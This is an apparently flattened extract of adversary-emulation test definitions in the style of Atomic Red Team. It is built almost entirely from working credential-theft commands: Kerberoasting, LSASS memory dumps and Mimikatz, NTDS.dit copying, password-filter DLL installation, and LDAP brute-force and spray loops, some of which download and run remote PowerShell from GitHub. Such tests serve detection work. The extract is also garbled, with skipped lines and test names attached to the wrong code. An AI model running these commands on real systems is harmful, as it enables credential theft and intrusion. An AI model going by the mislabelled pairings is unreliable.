521: [- name: Request for service tickets] [attack_technique: T1558.003] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
522: [- name: Request for service tickets] [attack_technique: T1558.003] [      iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing)]
523: [- name: Request for service tickets] [attack_technique: T1558.003] [      Invoke-Kerberoast | fl]
526: [- name: Rubeus kerberoast] [attack_technique: T1558.003] [    command: |]
527: [- name: Rubeus kerberoast] [attack_technique: T1558.003] [      klist purge]
528: [- name: Rubeus kerberoast] [attack_technique: T1558.003] [      cmd.exe /c "#{local_folder}\#{local_executable}" kerberoast #{flags} /outfile:"#{local_folder}\#{out_file}"]
533: [- name: Extract all accounts in use as SPN using setspn] [attack_technique: T1558.003] [    command: |]
534: [- name: Extract all accounts in use as SPN using setspn] [attack_technique: T1558.003] [      setspn -T #{domain_name} -Q */*]
537: [- name: Request A Single Ticket via PowerShell] [attack_technique: T1558.003] [    command: |]
538: [- name: Request A Single Ticket via PowerShell] [attack_technique: T1558.003] [      Add-Type -AssemblyName System.IdentityModel]
539: [- name: Request A Single Ticket via PowerShell] [attack_technique: T1558.003] [      $ComputerFQDN=$env:LogonServer.trimStart('\') + "." + $env:UserDnsDomain]
540: [- name: Request A Single Ticket via PowerShell] [attack_technique: T1558.003] [      New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/$ComputerFQDN" ]
543: [- name: Request All Tickets via PowerShell] [attack_technique: T1558.003] [    command: |]
544: [- name: Request All Tickets via PowerShell] [attack_technique: T1558.003] [      Add-Type -AssemblyName System.IdentityModel  ]
545: [- name: Request All Tickets via PowerShell] [attack_technique: T1558.003] [      setspn.exe -T #{domain_name} -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  ]
559: [- name: Input Capture] [attack_technique: T1056.001] [    command: |]
560: [- name: Input Capture] [attack_technique: T1056.001] [      Set-Location $PathToAtomicsFolder]
561: [- name: Input Capture] [attack_technique: T1056.001] [      .\T1056.001\src\Get-Keystrokes.ps1 -LogPath #{filepath}]
572: [- name: Dump LSASS.exe Memory using ProcDump] [attack_technique: T1003.001] [    command: |]
573: [- name: Dump LSASS.exe Memory using ProcDump] [attack_technique: T1003.001] [      #{procdump_exe} -accepteula -ma lsass.exe #{output_file}]
578: [- name: Dump LSASS.exe Memory using comsvcs.dll] [attack_technique: T1003.001] [    command: |]
579: [- name: Dump LSASS.exe Memory using comsvcs.dll] [attack_technique: T1003.001] [      C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full]
584: [- name: Dump LSASS.exe Memory using direct system calls and API unhooking] [attack_technique: T1003.001] [    command: |]
585: [- name: Dump LSASS.exe Memory using direct system calls and API unhooking] [attack_technique: T1003.001] [      #{dumpert_exe}]
590: [- name: Dump LSASS.exe Memory using NanoDump] [attack_technique: T1003.001] [    command: |]
591: [- name: Dump LSASS.exe Memory using NanoDump] [attack_technique: T1003.001] [      %temp%\nanodump.x64.exe -w "%temp%\nanodump.dmp"]
596: [- name: Offline Credential Theft With Mimikatz] [attack_technique: T1003.001] [    command: |]
597: [- name: Offline Credential Theft With Mimikatz] [attack_technique: T1003.001] [      #{mimikatz_exe} "sekurlsa::minidump #{input_file}" "sekurlsa::logonpasswords full" exit]
600: [- name: LSASS read with pypykatz] [attack_technique: T1003.001] [    command: |]
601: [- name: LSASS read with pypykatz] [attack_technique: T1003.001] [      pypykatz live lsa]
604: [- name: Dump LSASS.exe Memory using Out-Minidump.ps1] [attack_technique: T1003.001] [    command: |]
605: [- name: Dump LSASS.exe Memory using Out-Minidump.ps1] [attack_technique: T1003.001] [       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
606: [- name: Dump LSASS.exe Memory using Out-Minidump.ps1] [attack_technique: T1003.001] [       IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'); get-process lsass | Out-Minidump]
611: [- name: Create Mini Dump of LSASS.exe using ProcDump] [attack_technique: T1003.001] [    command: |]
612: [- name: Create Mini Dump of LSASS.exe using ProcDump] [attack_technique: T1003.001] [      #{procdump_exe} -accepteula -mm lsass.exe #{output_file}]
617: [- name: Powershell Mimikatz] [attack_technique: T1003.001] [    command: |]
618: [- name: Powershell Mimikatz] [attack_technique: T1003.001] [      IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds]
621: [- name: Dump LSASS with .Net 5 createdump.exe] [attack_technique: T1003.001] [    command: |]
622: [- name: Dump LSASS with .Net 5 createdump.exe] [attack_technique: T1003.001] [      echo "Createdump Path #{createdump_exe}"]
623: [- name: Dump LSASS with .Net 5 createdump.exe] [attack_technique: T1003.001] [      $LSASS = tasklist | findstr "lsass"]
624: [- name: Dump LSASS with .Net 5 createdump.exe] [attack_technique: T1003.001] [      $FIELDS = $LSASS -split "\s+"]
625: [- name: Dump LSASS with .Net 5 createdump.exe] [attack_technique: T1003.001] [      $ID = $FIELDS[1]]
626: [- name: Dump LSASS with .Net 5 createdump.exe] [attack_technique: T1003.001] [      & "#{createdump_exe}" -u -f #{output_file} $ID]
631: [- name: Dump LSASS.exe using imported Microsoft DLLs] [attack_technique: T1003.001] [    command: |]
632: [- name: Dump LSASS.exe using imported Microsoft DLLs] [attack_technique: T1003.001] [      #{xordump_exe} -out #{output_file} -x 0x41]
637: [- name: Create Volume Shadow Copy with vssadmin] [attack_technique: T1003.003] [    command: |]
638: [- name: Create Volume Shadow Copy with vssadmin] [attack_technique: T1003.003] [      vssadmin.exe create shadow /for=#{drive_letter}]
641: [- name: Copy NTDS.dit from Volume Shadow Copy] [attack_technique: T1003.003] [    command: |]
642: [- name: Copy NTDS.dit from Volume Shadow Copy] [attack_technique: T1003.003] [      copy #{vsc_name}\Windows\NTDS\NTDS.dit #{extract_path}\ntds.dit]
643: [- name: Copy NTDS.dit from Volume Shadow Copy] [attack_technique: T1003.003] [      copy #{vsc_name}\Windows\System32\config\SYSTEM #{extract_path}\VSC_SYSTEM_HIVE]
644: [- name: Copy NTDS.dit from Volume Shadow Copy] [attack_technique: T1003.003] [      reg save HKLM\SYSTEM #{extract_path}\SYSTEM_HIVE]
651: [- name: Dump Active Directory Database with NTDSUtil] [attack_technique: T1003.003] [    command: |]
652: [- name: Dump Active Directory Database with NTDSUtil] [attack_technique: T1003.003] [      mkdir #{output_folder}]
653: [- name: Dump Active Directory Database with NTDSUtil] [attack_technique: T1003.003] [      ntdsutil "ac i ntds" "ifm" "create full #{output_folder}" q q]
658: [- name: Create Volume Shadow Copy with WMI] [attack_technique: T1003.003] [    command: |]
659: [- name: Create Volume Shadow Copy with WMI] [attack_technique: T1003.003] [      wmic shadowcopy call create Volume=#{drive_letter}]
662: [- name: Create Volume Shadow Copy remotely with WMI] [attack_technique: T1003.003] [    command: |]
663: [- name: Create Volume Shadow Copy remotely with WMI] [attack_technique: T1003.003] [      wmic /node:"#{target_host}" shadowcopy call create Volume=#{drive_letter}]
666: [- name: Create Volume Shadow Copy remotely (WMI) with esentutl] [attack_technique: T1003.003] [    command: |]
667: [- name: Create Volume Shadow Copy remotely (WMI) with esentutl] [attack_technique: T1003.003] [      wmic /node:"#{target_host}" process call create "cmd.exe /c esentutl.exe /y /vss #{source_path} /d #{target_path}"]
670: [- name: Create Volume Shadow Copy with Powershell] [attack_technique: T1003.003] [    command: |]
671: [- name: Create Volume Shadow Copy with Powershell] [attack_technique: T1003.003] [      (gwmi -list win32_shadowcopy).Create('#{drive_letter}','ClientAccessible')]
674: [- name: Create Symlink to Volume Shadow Copy] [attack_technique: T1003.003] [    command: |]
675: [- name: Create Symlink to Volume Shadow Copy] [attack_technique: T1003.003] [      vssadmin.exe create shadow /for=#{drive_letter}]
676: [- name: Create Symlink to Volume Shadow Copy] [attack_technique: T1003.003] [      mklink /D #{symlink_path} \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1]
679: [- name: Packet Capture Windows Command Prompt] [attack_technique: T1040] [    command: |]
680: [- name: Packet Capture Windows Command Prompt] [attack_technique: T1040] [      "c:\Program Files\Wireshark\tshark.exe" -i #{interface} -c 5]
683: [- name: Windows Internal pktmon capture] [attack_technique: T1040] [    command: |]
684: [- name: Windows Internal pktmon capture] [attack_technique: T1040] [      pktmon.exe start --etw  -f %TEMP%\t1040.etl]
685: [- name: Windows Internal pktmon capture] [attack_technique: T1040] [      TIMEOUT /T 5 >nul 2>&1]
686: [- name: Windows Internal pktmon capture] [attack_technique: T1040] [      pktmon.exe stop]
691: [- name: Windows Internal pktmon set filter] [attack_technique: T1040] [    command: |]
692: [- name: Windows Internal pktmon set filter] [attack_technique: T1040] [      pktmon.exe filter add -p 445]
697: [- name: Gsecdump] [attack_technique: T1003] [    command: |]
698: [- name: Gsecdump] [attack_technique: T1003] [      #{gsecdump_exe} -a]
722: [- name: Dump svchost.exe to gather RDP credentials] [attack_technique: T1003] [    command: |]
723: [- name: Dump svchost.exe to gather RDP credentials] [attack_technique: T1003] [      $ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)]
724: [- name: Dump svchost.exe to gather RDP credentials] [attack_technique: T1003] [      if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }]
725: [- name: Dump svchost.exe to gather RDP credentials] [attack_technique: T1003] [      C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full]
740: [- name: Install and Register Password Filter DLL] [attack_technique: T1556.002] [    command: |]
741: [- name: Install and Register Password Filter DLL] [attack_technique: T1556.002] [      $passwordFilterName = (Copy-Item "#{input_dll}" -Destination "C:\Windows\System32" -PassThru).basename]
742: [- name: Install and Register Password Filter DLL] [attack_technique: T1556.002] [      $lsaKey = Get-Item "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"]
743: [- name: Install and Register Password Filter DLL] [attack_technique: T1556.002] [      $notificationPackagesValues = $lsaKey.GetValue("Notification Packages")]
744: [- name: Install and Register Password Filter DLL] [attack_technique: T1556.002] [      $notificationPackagesValues += $passwordFilterName]
745: [- name: Install and Register Password Filter DLL] [attack_technique: T1556.002] [      Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\" "Notification Packages" $notificationPackagesValues]
746: [- name: Install and Register Password Filter DLL] [attack_technique: T1556.002] [      Restart-Computer -Confirm]
749: [- name: Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.001] [    command: |]
750: [- name: Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.001] [      echo Password1> passwords.txt]
751: [- name: Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.001] [      echo 1q2w3e4r>> passwords.txt]
752: [- name: Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.001] [      echo Password!>> passwords.txt]
753: [- name: Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.001] [      echo Spring2022>> passwords.txt]
754: [- name: Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.001] [      echo ChangeMe!>> passwords.txt]
755: [- name: Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.001] [      @FOR /F "delims=" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:"%userdomain%\#{user}" "%p" 1>NUL 2>&1 && @echo [*] #{user}:%p && @net use /delete %logonserver%\IPC$ > NUL]
756: [- name: Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.001] []
757: [- name: Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.001] [  auto_generated_guid: c2969434-672b-4ec8-8df0-bbb91f40e250]
758: [- name: Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.001] [    Attempt to brute force Active Directory domain user on a domain controller, via LDAP, with NTLM or Kerberos]
759: [- name: Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.001] [  supported_platforms:]
760: [- name: Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.001] [  - windows]
761: [- name: Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.001] [  input_arguments:]
762: [- name: Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.001] [    user:]
763: [- name: Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.001] [      type: String]
764: [- name: Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.001] [      default: $ENV:USERNAME]
765: [- name: Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.001] [    passwords_path:]
766: [- name: Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.001] [      type: Path]
767: [- name: Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.001] [      default: PathToAtomicsFolder\T1110.001\src\passwords.txt]
768: [- name: Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.001] [    domain:]
769: [- name: Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.001] [      type: String]
770: [- name: Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.001] [      default: $env:UserDnsDomain]
771: [- name: Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.001] [    auth:]
772: [- name: Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.001] [      type: String]
773: [- name: Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.001] [      default: NTLM]
774: [- name: Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.001] [  executor:]
777: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] [    command: |]
778: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] [      if ("#{auth}".ToLower() -NotIn @("ntlm","kerberos")) {]
779: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] [        Write-Host "Only 'NTLM' and 'Kerberos' auth methods are supported"]
780: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] [        exit 1]
781: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] [      }]
782: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] []
783: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] [      [System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null]
784: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] [      $di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier("#{domain}",389)]
785: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] []
786: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] [      $passwordList = Get-Content -Path #{passwords_path}]
787: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] [      foreach ($password in $passwordList){]
788: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] [        $credz = new-object System.Net.NetworkCredential("#{user}", $password, "#{domain}")]
789: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] [        $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})]
790: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] [        try {]
791: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] [          Write-Host " [-] Attempting ${password} on account #{user}."]
792: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] [          $conn.bind()]
793: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] [          # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success]
794: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] [          Write-Host " [!] #{user}:${password} are valid credentials!"]
795: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] [        } catch {]
796: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] [          Write-Host $_.Exception.Message]
797: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] [        }]
798: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] [      }]
799: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] [      Write-Host "End of bruteforce"]
800: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] []
801: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] [  auto_generated_guid: 5a51ef57-299e-4d62-8e11-2d440df55e69]
802: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] [  - azure-ad]
803: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] [  input_arguments:]
804: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] [    username:]
805: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] [      type: String]
806: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] [      default: bruce.wayne@contoso.com]
807: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] [    passwords:]
808: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] [      type: String]
809: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] [      default: Password1`n1q2w3e4r`nPassword!]
810: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] [  dependency_executor_name: powershell]
811: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] [  dependencies:]
812: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] [  - description: |]
813: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] [      AzureAD module must be installed.]
814: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] [    prereq_command: |]
815: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] [      try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}]
816: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] [    get_prereq_command: |]
817: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] [      Install-Module -Name AzureAD -Force]
818: [- name: Brute Force Credentials of single Azure AD user] [attack_technique: T1110.001] [  executor:]
821: [- name: Password Spray (DomainPasswordSpray)] [attack_technique: T1110.003] [    command: |]
822: [- name: Password Spray (DomainPasswordSpray)] [attack_technique: T1110.003] [      @FOR /F %n in (%temp%\users.txt) do @echo | set/p=. & @net use %logonserver%\IPC$ /user:"%userdomain%\%n" "#{password}" 1>NUL 2>&1 && @echo [*] %n:#{password} && @net use /delete %logonserver%\IPC$ > NUL]
823: [- name: Password Spray (DomainPasswordSpray)] [attack_technique: T1110.003] [  auto_generated_guid: 263ae743-515f-4786-ac7d-41ef3a0d4b2b]
824: [- name: Password Spray (DomainPasswordSpray)] [attack_technique: T1110.003] [    Perform a domain password spray using the DomainPasswordSpray tool. It will try a single password against all users in the domain]
825: [- name: Password Spray (DomainPasswordSpray)] [attack_technique: T1110.003] []
826: [- name: Password Spray (DomainPasswordSpray)] [attack_technique: T1110.003] [    https://github.com/dafthack/DomainPasswordSpray]
827: [- name: Password Spray (DomainPasswordSpray)] [attack_technique: T1110.003] [  supported_platforms:]
828: [- name: Password Spray (DomainPasswordSpray)] [attack_technique: T1110.003] [    - windows]
829: [- name: Password Spray (DomainPasswordSpray)] [attack_technique: T1110.003] [  input_arguments:]
830: [- name: Password Spray (DomainPasswordSpray)] [attack_technique: T1110.003] [    domain:]
831: [- name: Password Spray (DomainPasswordSpray)] [attack_technique: T1110.003] [      type: String]
832: [- name: Password Spray (DomainPasswordSpray)] [attack_technique: T1110.003] [      default: $Env:USERDOMAIN]
833: [- name: Password Spray (DomainPasswordSpray)] [attack_technique: T1110.003] [  executor:]
836: [- name: Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.003] [    command: |]
837: [- name: Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.003] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
838: [- name: Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.003] [      IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain #{domain} -Force]
839: [- name: Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.003] [  auto_generated_guid: f14d956a-5b6e-4a93-847f-0c415142f07d]
840: [- name: Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.003] [  - windows]
841: [- name: Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.003] [  input_arguments:]
842: [- name: Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.003] [    password:]
843: [- name: Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.003] [      type: String]
844: [- name: Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.003] [      default: P@ssw0rd!]
845: [- name: Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.003] [    domain:]
846: [- name: Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.003] [      type: String]
847: [- name: Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.003] [      default: $env:UserDnsDomain]
848: [- name: Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.003] [    auth:]
849: [- name: Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.003] [      type: String]
850: [- name: Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.003] [      default: NTLM]
851: [- name: Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos)] [attack_technique: T1110.003] [  executor:]
854: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [    command: |]
855: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [      if ("#{auth}".ToLower() -NotIn @("ntlm","kerberos")) {]
856: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [        Write-Host "Only 'NTLM' and 'Kerberos' auth methods are supported"]
857: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [        exit 1]
858: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [      }]
859: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] []
860: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [      $DomainUsers = Get-ADUser -LDAPFilter '(&(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server #{domain} | Select-Object -ExpandProperty SamAccountName]
861: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] []
862: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [      [System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null]
863: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [      $di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier("#{domain}",389)]
864: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] []
865: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [      $DomainUsers | Foreach-Object {]
866: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [        $user = $_]
867: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [        $password = '#{password}']
868: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] []
869: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [        $credz = new-object System.Net.NetworkCredential($user, $password, "#{domain}")]
870: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [        $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})]
871: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [        try {]
872: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [          Write-Host " [-] Attempting ${password} on account ${user}."]
873: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [          $conn.bind()]
874: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [          # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success]
875: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [          Write-Host " [!] ${user}:${password} are valid credentials!"]
876: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [        } catch {]
877: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [          Write-Host $_.Exception.Message]
878: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [        }]
879: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [      }]
880: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [      Write-Host "End of password spraying"]
881: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [  auto_generated_guid: a8aa2d3e-1c52-4016-bc73-0f8854cfa80a]
882: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [  - azure-ad]
883: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [  input_arguments:]
884: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [    password:]
885: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [      type: String]
886: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [      default: P@ssw0rd!]
887: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [    valid_username:]
888: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [      type: String]
889: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [      default: bruce.wayne@contoso.com]
890: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [    valid_password:]
891: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [      type: String]
892: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [      default: iamthebatman]
893: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [  dependency_executor_name: powershell]
894: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [  dependencies:]
895: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [  - description: |]
896: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [      AzureAD module must be installed.]
897: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [    prereq_command: |]
898: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [      try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}]
899: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [    get_prereq_command: |]
900: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [      Install-Module -Name AzureAD -Force]
901: [- name: Password spray all Azure AD users with a single password ] [attack_technique: T1110.003] [  executor:]
904: [- name: WinPwn - DomainPasswordSpray Attacks] [attack_technique: T1110.003] [    command: |]
905: [- name: WinPwn - DomainPasswordSpray Attacks] [attack_technique: T1110.003] [      Import-Module -Name AzureAD]
906: [- name: WinPwn - DomainPasswordSpray Attacks] [attack_technique: T1110.003] [      $PWord = ConvertTo-SecureString -String "#{valid_password}" -AsPlainText -Force]
907: [- name: WinPwn - DomainPasswordSpray Attacks] [attack_technique: T1110.003] [      $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{valid_username}", $Pword]
908: [- name: WinPwn - DomainPasswordSpray Attacks] [attack_technique: T1110.003] [      Connect-AzureAD -Credential $Credential > $null]
909: [- name: WinPwn - DomainPasswordSpray Attacks] [attack_technique: T1110.003] []
910: [- name: WinPwn - DomainPasswordSpray Attacks] [attack_technique: T1110.003] [      ($Users = Get-AzureADUser -All $true) > $null]
